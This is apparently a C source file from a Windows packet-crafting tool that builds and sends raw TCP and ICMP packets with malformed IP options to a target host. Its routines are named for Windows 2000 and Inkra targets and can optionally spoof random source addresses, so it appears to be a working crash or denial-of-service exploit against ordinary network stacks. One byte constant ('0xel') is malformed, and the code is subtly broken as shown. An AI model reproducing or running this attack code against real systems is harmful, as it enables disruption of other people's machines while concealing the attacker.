
/*
 * ^ipopt.c
 * */

#include <windows.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <stdlib.h>

#include "pcap.h"
#include "Packet32.h"
#include "Ntddndis.h"

#include "pub.h"
#include "misc.h"
#include "ipopt.h"

/****************************************************************************/

enum {
	IPOPT_INKRA_ICMP_NUM=1,
	IPOPT_INKRA_ICMP_TLEN=0x58,
	IPOPT_INKRA_ICMP_HLEN=0x38,
	IPOPT_INKRA_ICMP_ILEN=0x20,
	IPOPT_INKRA_ICMP_OLEN=0x44
};

static unsigned char ipopt_inkra_icmp[IPOPT_INKRA_ICMP_NUM][IPOPT_INKRA_ICMP_OLEN] = {
	{ 0xEB, 0x21, 0xAD, 0xA6, 0xEB, 0xE1, 0x35, 0x9B, 0xCE, 0xDD,
	  0xA7, 0x11, 0xEA, 0x5D, 0xC5, 0x96, 0xAF, 0x47, 0xC1, 0x50,
	  0xF1, 0xD1, 0x5C, 0x4B, 0x18, 0x9A, 0xC1, 0x8A, 0x13, 0x6B,
	  0x48, 0x5E, 0x74, 0x83, 0xC6, 0x06, 0xAA, 0x9A, 0x5E, 0xC2,
	  0xA6, 0x75, 0x38, 0x44, 0xF8, 0x43, 0xD7, 0x3F, 0xAE, 0xA1,
	  0xE0, 0xC6, 0xE3, 0x7C, 0x4B, 0x59, 0x7A, 0x95, 0x1E, 0x70,
	  0xCC, 0x04, 0x1B, 0x2A, 0xD1, 0x6E, 0x38, 0x83 }
};

static int ipopt_check_inkra_icmp(struct sf_task *task, unsigned char *buf,
	unsigned char *ip, unsigned int pad) 
{
	int k, i, j;
	signed int ret;
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];

	ip[0] = 0x4e;
	ip[1] = 0xcc;
	ip[2] = 0x00;
	ip[3] = IPOPT_INKRA_ICMP_TLEN;
	ip[6] = 0x00;
	ip[7] = 0x00;
	ip[9] = 0x01;

	for (k = 0; IPOPT_INKRA_ICMP_NUM > k; k++) {
		memcpy(ip + 16, task->dip, 4);
		memcpy(ip + 20, ipopt_inkra_icmp[k], IPOPT_INKRA_ICMP_OLEN);

		for (j = 0; 5 > j; j++) {
			switch (WaitForSingleObject(task->stop, 
				1 < j ? 10 * (j - 1) : 0)) {
			case WAIT_TIMEOUT:
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0\n");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}

			if (task->fake) {
				buf[8] = (0xff * rand()) / RAND_MAX;
				buf[9] = (0xff * rand()) / RAND_MAX;
				buf[10] = (0xff * rand()) / RAND_MAX;
				buf[11] = (0xff * rand()) / RAND_MAX;
			}

			ip[4] = (0xff * rand()) / RAND_MAX;
			ip[5] = (0xff * rand()) / RAND_MAX;
			ip[8] = (0xff * rand()) / RAND_MAX;

			if (task->fake) {
				ip[12] = (0xff * rand()) / RAND_MAX;
				ip[13] = (0xff * rand()) / RAND_MAX;
				ip[14] = (0xff * rand()) / RAND_MAX;
				ip[15] = (0xff * rand()) / RAND_MAX;
				ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
				ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
				ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
				ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
			}

#if 1
			if (j) {
				for (i = 0; IPOPT_INKRA_ICMP_ILEN - 4 > i; i++) 
					ip[IPOPT_INKRA_ICMP_HLEN + 4 + i] = 
						(0xff * rand()) / RAND_MAX;
			}
#endif

			do_csum(ip, ip + 10, IPOPT_INKRA_ICMP_HLEN, 
				ip + IPOPT_INKRA_ICMP_HLEN, 
				ip + IPOPT_INKRA_ICMP_HLEN + 2, 
				IPOPT_INKRA_ICMP_TLEN - IPOPT_INKRA_ICMP_HLEN, 0);

			ret = spy_kernel(task, buf, 
				IPOPT_INKRA_ICMP_TLEN + pad + 14, arpip); 
			if (0 >= ret)
				return abs(ret);
		}
	}

	return 0;
}

/****************************************************************************/

enum {
	IPOPT_2K_ICMP_NUM=1,
	IPOPT_2K_ICMP_TLEN=0xB0,
	IPOPT_2K_ICMP_HLEN=0x3C,
	IPOPT_2K_ICMP_ILEN=0x74,
	IPOPT_2K_ICMP_OLEN=0x9C
};

static unsigned char ipopt_2k_icmp[IPOPT_2K_ICMP_NUM][IPOPT_2K_ICMP_OLEN] = {
	{ 0xE5, 0x27, 0x61, 0x6D, 0x66, 0xAD, 0x29, 0x96, 0xC0, 0x3A,
	  0x79, 0x78, 0x73, 0x95, 0x96, 0xF5, 0x5E, 0x11, 0x43, 0x1D,
	  0xC5, 0x0C, 0x50, 0x2C, 0x6B, 0x5A, 0x90, 0x43, 0x91, 0xC2,
	  0x72, 0x4D, 0x65, 0x73, 0xCB, 0x27, 0xA9, 0x9F, 0x1B, 0x8D,
	  0x08, 0x1E, 0xE5, 0x27, 0x03, 0x48, 0xCB, 0x14, 0xD8, 0xDD, 
	  0xD4, 0x63, 0x52, 0x47, 0xF2, 0x69, 0xD7, 0xE9, 0x94, 0x82, 
	  0xC3, 0xDB, 0x88, 0x89, 0x48, 0xCC, 0x6F, 0x0D, 0xDC, 0x5A, 
	  0xDC, 0x94, 0x9D, 0x9C, 0xC8, 0xF1, 0x76, 0x3C, 0x76, 0x24, 
	  0x8F, 0xCD, 0x7D, 0xDD, 0xDC, 0xC4, 0x1C, 0x33, 0x3D, 0xB5, 
	  0x75, 0x73, 0x08, 0x4C, 0xF2, 0xB7, 0x7F, 0x9A, 0x59, 0x35, 
	  0xFD, 0x29, 0xCD, 0xCF, 0x57, 0x73, 0x69, 0x02, 0x4C, 0x37, 
	  0x87, 0x92, 0x77, 0x3C, 0x6F, 0x35, 0xA5, 0x02, 0x8E, 0x81, 
	  0xF2, 0xF2, 0xD7, 0x6A, 0xA0, 0x8C, 0x87, 0x9B, 0x08, 0x2A, 
	  0xE0, 0xDF, 0x91, 0xBE, 0x14, 0x0A, 0x12, 0x4C, 0xF7, 0x70, 
	  0x8A, 0x65, 0xB6, 0x75, 0x91, 0x6B, 0x24, 0x3B, 0x76, 0xE5, 
	  0xD4, 0xF3, 0x5B, 0xBB, 0xA5, 0xE4 }  
};

static int ipopt_check_2k_icmp(struct sf_task *task, unsigned char *buf,
	unsigned char *ip, unsigned int pad) 
{
	int k, i, j;
	signed int ret;
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];

	ip[0] = 0x4f;
	ip[1] = 0x00;
	ip[2] = 0x00;
	ip[3] = IPOPT_2K_ICMP_TLEN;
	ip[6] = 0x00;
	ip[7] = 0x00;
	ip[9] = 0x01;

	for (k = 0; IPOPT_2K_ICMP_NUM > k; k++) {
		memcpy(ip + 16, task->dip, 4);
		memcpy(ip + 20, ipopt_2k_icmp[k], IPOPT_2K_ICMP_OLEN);

		for (j = 0; 5 > j; j++) {
			switch (WaitForSingleObject(task->stop, 
				1 < j ? 10 * (j - 1) : 0)) {
			case WAIT_TIMEOUT:
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0\n");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}

			if (task->fake) {
				buf[8] = (0xff * rand()) / RAND_MAX;
				buf[9] = (0xff * rand()) / RAND_MAX;
				buf[10] = (0xff * rand()) / RAND_MAX;
				buf[11] = (0xff * rand()) / RAND_MAX;
			}

			ip[4] = (0xff * rand()) / RAND_MAX;
			ip[5] = (0xff * rand()) / RAND_MAX;
			ip[8] = (0xff * rand()) / RAND_MAX;
			if (task->fake) {
				ip[12] = (0xff * rand()) / RAND_MAX;
				ip[13] = (0xff * rand()) / RAND_MAX;
				ip[14] = (0xff * rand()) / RAND_MAX;
				ip[15] = (0xff * rand()) / RAND_MAX;
				ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
				ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
				ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
				ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
			}

#if 0
			if (j) {
				for (i = 0; IPOPT_2K_ICMP_ILEN - 4 > i; i++) 
					ip[IPOPT_2K_ICMP_HLEN + 4 + i] = 
						(0xff * rand()) / RAND_MAX;
			}
#endif

			do_csum(ip, ip + 10, IPOPT_2K_ICMP_HLEN, 
				ip + IPOPT_2K_ICMP_HLEN, 
				ip + IPOPT_2K_ICMP_HLEN + 2, 
				IPOPT_2K_ICMP_TLEN - IPOPT_2K_ICMP_HLEN, 0);

			ret = spy_kernel(task, buf, 
				IPOPT_2K_ICMP_TLEN + pad + 14, arpip); 
			if (0 >= ret)
				return abs(ret);
		}
	}

	return 0;
}

/****************************************************************************/

enum {
	IPOPT_2K_TCP_NUM=3,
	IPOPT_2K_TCP_TLEN=0x50,
	IPOPT_2K_TCP_HLEN=0x3c,
	IPOPT_2K_TCP_OLEN=0x28
};

static unsigned char ipopt_2k_tcp[IPOPT_2K_TCP_NUM][IPOPT_2K_TCP_OLEN] = {
	{ 0x88, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	  0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	  0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	  0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x0c },
	{ 0xc5, 0x19, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	  0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	  0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	  0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x1c },
	{ 0x4c, 0x27, 0x9e, 0xf3, 0xbc, 0x9c, 0x13, 0x95, 0x6c, 0x1a,
	  0x0b, 0x23, 0x1c, 0xd8, 0xe1, 0xe7, 0x50, 0x8f, 0x29, 0xa5,
	  0xe2, 0xdf, 0xe3, 0x09, 0x34, 0xe7, 0x90, 0x9a, 0x0d, 0xae,
	  0x67, 0x3b, 0xb6, 0x04, 0x72, 0xec, 0x56, 0x94, 0xel, 0xf5 }
};

static int ipopt_check_2k_tcp(struct sf_task *task, unsigned char *buf,
	unsigned char *ip, unsigned int pad) 
{
	int k, m;
	signed int ret;
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];

	ip[0] = 0x4f;
	ip[1] = 0x00;
	ip[2] = 0x00;
	ip[3] = IPOPT_2K_TCP_TLEN;
	ip[6] = 0x00;
	ip[7] = 0x00;
	ip[9] = 0x06;
	ip[72] = 0x50;
	/**/
	ip[78] = 0x00;
	ip[79] = 0x00;
	/**/
	if (task->dport[0] || task->dport[1]) {
		ip[62] = task->dport[0];
		ip[63] = task->dport[1];
	}

	for (m = 0; 7 > m; m++) {
		for (k = 0; IPOPT_2K_TCP_NUM > k; k++) {
			switch (WaitForSingleObject(task->stop, 0)) {
			case WAIT_TIMEOUT:
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0\n");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}

			if (task->fake) {
				buf[8] = (0xff * rand()) / RAND_MAX;
				buf[9] = (0xff * rand()) / RAND_MAX;
				buf[10] = (0xff * rand()) / RAND_MAX;
				buf[11] = (0xff * rand()) / RAND_MAX;
			}

			ip[4] = (0xff * rand()) / RAND_MAX;
			ip[5] = (0xff * rand()) / RAND_MAX;
			ip[8] = (0xff * rand()) / RAND_MAX;

			if (task->fake) {
				ip[12] = (0xff * rand()) / RAND_MAX;
				ip[13] = (0xff * rand()) / RAND_MAX;
				ip[14] = (0xff * rand()) / RAND_MAX;
				ip[15] = (0xff * rand()) / RAND_MAX;
				ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
				ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
				ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
				ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
			}

			memcpy(ip + 16, task->dip, 4);
			ip[60] = (0xff * rand()) / RAND_MAX;
			ip[61] = (0xff * rand()) / RAND_MAX;
			if (0 == task->dport[0] && 0 == task->dport[1]) {
				ip[62] = (0xff * rand()) / RAND_MAX;
				ip[63] = (0xff * rand()) / RAND_MAX;
			}
			ip[64] = (0xff * rand()) / RAND_MAX;
			ip[65] = (0xff * rand()) / RAND_MAX;
			ip[66] = (0xff * rand()) / RAND_MAX;
			ip[67] = (0xff * rand()) / RAND_MAX;
			ip[68] = (0xff * rand()) / RAND_MAX;
			ip[69] = (0xff * rand()) / RAND_MAX;
			ip[70] = (0xff * rand()) / RAND_MAX;
			ip[71] = (0xff * rand()) / RAND_MAX;

			switch ((rand() % 5)) {
			case 0:
			case 1:
				ip[73] = (0xff * rand()) / RAND_MAX;
				break;
			case 2:
				ip[73] = 0x02;
				break;
			case 3:
				ip[73] = 0x14;
				break;
			case 4:
				ip[73] = 0x10;
				break;
			}

			ip[74] = (0xff * rand()) / RAND_MAX;
			ip[75] = (0xff * rand()) / RAND_MAX;
			/*
			ip[78] = (0xff * rand()) / RAND_MAX;
			ip[79] = (0xff * rand()) / RAND_MAX;
			*/

			memcpy(ip + 20, ipopt_2k_tcp[k], IPOPT_2K_TCP_OLEN);

			do_csum(ip, ip + 10, IPOPT_2K_TCP_HLEN, 
				ip + IPOPT_2K_TCP_HLEN, 
				ip + IPOPT_2K_TCP_HLEN + 16, 
				IPOPT_2K_TCP_TLEN - IPOPT_2K_TCP_HLEN, 1);

			ret = spy_kernel(task, buf, 
				IPOPT_2K_TCP_TLEN + pad + 14, arpip); 
			if (0 >= ret)
				return abs(ret);
		}

		switch (WaitForSingleObject(task->stop, 
			1 < m ? 100 * (m - 1) : 0)) {
		case WAIT_TIMEOUT:
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0\n");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}
	}

	return 0;
}

/****************************************************************************/

int do_ipopt(struct sf_task *task, unsigned char *buf, unsigned int pad,
	int type)
{
	unsigned char *ip = buf + 14 + pad;
	int i;

	switch (type) {
	case TYPE_IPOPT:
		if (ipopt_check_2k_tcp(task, buf, ip, pad))
			return 1;

		break;
	case TYPE_IPOPT_ICMP:
		if (ipopt_check_inkra_icmp(task, buf, ip, pad))
			return 1;

		if (ipopt_check_2k_icmp(task, buf, ip, pad))
			return 1;

		break;
	default:
		win_error("not valid ipopt type");
		break;
	}

	return 0;
}

/*
 * ipopt.c$
 * */

